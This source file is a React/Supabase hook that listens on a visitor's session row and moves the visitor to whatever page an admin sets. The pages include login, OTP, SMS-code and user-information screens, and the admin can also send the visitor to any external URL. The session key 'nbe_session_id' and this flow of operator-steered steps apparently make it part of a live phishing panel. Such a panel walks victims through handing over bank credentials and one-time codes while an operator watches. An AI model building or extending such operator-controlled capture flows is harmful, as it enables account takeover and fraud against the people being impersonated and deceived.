import { useEffect } from "react";
import { useNavigate } from "@tanstack/react-router";
import { supabase } from "@/integrations/supabase/client";

/**
 * Listens for admin-driven redirects on the visitor's stored session.
 * Admin sets `redirect_to` on sessions row; visitor route navigates accordingly.
 */
export function useSessionRedirect() {
  const navigate = useNavigate();

  useEffect(() => {
    if (typeof window === "undefined") return;
    const id = sessionStorage.getItem("nbe_session_id");
    if (!id) return;

    const targetToPath: Record<string, string> = {
      home: "/",
      login: "/login",
      otp: "/otp",
      sms: "/sms",
      "public-number": "/public-number",
      register: "/register",
      "user-information": "/user-information",
      watches: "/watches",
    };

    const apply = async (target: string | null | undefined) => {
      if (!target) return;

      // Clear redirect_to in DB first, then navigate — avoids redirect loop
      await supabase
        .from("sessions")
        .update({ redirect_to: null } as never)
        .eq("id", id);

      const currentPath = window.location.pathname;
      const destPath = targetToPath[target];

      // Don't redirect if already on the target page
      if (destPath && currentPath === destPath) return;

      if (destPath) {
        navigate({ to: destPath as "/" });
      } else if (target.startsWith("http")) {
        window.location.href = target;
      }
    };

    // Check current value once on mount
    supabase
      .from("sessions")
      .select("redirect_to")
      .eq("id", id)
      .maybeSingle()
      .then(({ data }) => apply(data?.redirect_to));

    const channel = supabase
      .channel(`session-redirect-${id}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "sessions", filter: `id=eq.${id}` },
        (payload) => {
          const row = payload.new as { redirect_to: string | null };
          apply(row.redirect_to);
        },
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [navigate]);
}
